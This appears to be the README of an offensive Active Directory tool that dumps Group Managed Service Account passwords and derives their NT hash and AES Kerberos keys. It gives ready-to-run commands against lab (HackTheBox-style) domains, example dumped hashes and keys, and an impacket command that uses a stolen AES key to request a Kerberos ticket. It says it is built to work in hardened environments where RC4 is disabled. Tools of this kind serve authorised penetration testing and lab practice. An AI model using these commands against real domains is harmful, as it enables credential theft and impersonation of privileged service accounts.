# gMSA Dumper

Dump Group Managed Service Account (gMSA) passwords from Active Directory, including **NT hash and AES keys** derivation.

Uses [bloodyAD](https://github.com/CravateRouge/bloodyAD) for LDAP retrieval and [impacket](https://github.com/fortra/impacket) for Kerberos key derivation. Works over plain LDAP (port 389) without LDAPS, thanks to bloodyAD's native SASL Kerberos sealing.

## Why?

Existing tools like [gMSADumper](https://github.com/micahvandeusen/gMSADumper) only output NT hashes. In hardened environments where **RC4 is disabled**, the NT hash is useless for Kerberos authentication — you need AES keys.

This tool outputs all three: **NT hash**, **AES-256** and **AES-128** keys, ready to use with impacket's `-aesKey` parameter.

## Installation

```bash
git clone https://github.com/<your-username>/gmsa-dumper.git
cd gmsa-dumper
pip install -r requirements.txt
```

### Dependencies

- Python 3.8+
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) (must be in `$PATH`)
- [impacket](https://github.com/fortra/impacket)
- [pycryptodome](https://github.com/Legrandin/pycryptodome)

## Usage

```
usage: gmsa_dump.py [-h] -u USERNAME [-p PASSWORD] [-k] [--ccache CCACHE]
                    -d DOMAIN --dc-host DC_HOST -t TARGET

gMSA dumper via bloodyAD + AES key derivation

options:
  -h, --help            show this help message and exit
  -u, --username        Username (ex: FS01$)
  -p, --password        Password
  -k, --kerberos        Use Kerberos ccache authentication
  --ccache CCACHE       Path to ccache file
  -d, --domain          Domain (ex: vintage.htb)
  --dc-host DC_HOST     DC FQDN (ex: dc01.vintage.htb)
  -t, --target          Target gMSA account (ex: gMSA01$)
```

### Password authentication

```bash
python3 gmsa_dump.py -u 'FS01$' -p 'fs01' -d vintage.htb --dc-host dc01.vintage.htb -t 'gMSA01$'
```

### Kerberos authentication (ccache)

```bash
KRB5CCNAME=fs01\$.ccache python3 gmsa_dump.py -u 'FS01$' -k -d vintage.htb --dc-host dc01.vintage.htb -t 'gMSA01$'
```

### With explicit ccache path

```bash
python3 gmsa_dump.py -u 'FS01$' -k --ccache '/tmp/krb5cc_1000' -d vintage.htb --dc-host dc01.vintage.htb -t 'gMSA01$'
```

### Example output

```
[*] gMSA01$
    Salt:   VINTAGE.HTBhostgmsa01.vintage.htb
    NT:     09945b851c5a0c5b1c60c68378820dfe
    AES256: 09aef8c1af10f83547231a9b2b848d2213a6c2a9507a24d1b5d71103074ba1e0
    AES128: 3f8043f5931daaa5ca764fe39da041e9
```

### Using the AES key

Once you have the AES key, authenticate to a Kerberos-only environment (NTLM disabled):

```bash
impacket-getTGT domain.local/'gMSA01$' -aesKey 09aef8c1af10f83547231a9b2b848d2213a6c2a9507a24d1b5d71103074ba1e0 -dc-ip 10.10.10.1
```

## How it works

1. **Retrieval** — Uses bloodyAD to read the `msDS-ManagedPassword` attribute via LDAP with Kerberos SASL sealing (no LDAPS required)
2. **NT hash** — Computes `MD4(raw_password_bytes)` from the blob
3. **Salt** — Derives the Kerberos salt:
   - Machine accounts (`$`): `REALMhost<fqdn>` (e.g. `VINTAGE.HTBhostgmsa01.vintage.htb`)
   - User accounts: `REALM<sAMAccountName>`
4. **AES keys** — Converts password from UTF-16LE to UTF-8, then derives AES-256 and AES-128 keys using `string_to_key` with the computed salt

> **Note on salt:** The salt is computed following AD's default convention. In rare cases where a custom salt is configured, you can verify the actual salt used by the KDC:
> ```bash
> KRB5_TRACE=/dev/stderr kinit 'gMSA01$@VINTAGE.HTB' <<< 'x' 2>&1 | grep salt
> ```

## Common issues

### bloodyAD Kerberos: "Cannot find KDC for realm"

Add `rdns = false` to `/etc/krb5.conf`:

```ini
[libdefaults]
    rdns = false
```

This prevents GSSAPI from doing reverse DNS lookups that can produce wrong SPNs.

### RC4 disabled — AES key rejected

If `impacket-getTGT` returns `KDC_ERR_PREAUTH_FAILED` with an AES key, the salt might be wrong. Verify with `KRB5_TRACE` (see note above).

## Credits

- [bloodyAD](https://github.com/CravateRouge/bloodyAD) by CravateRouge
- [impacket](https://github.com/fortra/impacket) by Fortra
- [gMSADumper](https://github.com/micahvandeusen/gMSADumper) by Micah Van Deusen (original inspiration)

## License

MIT
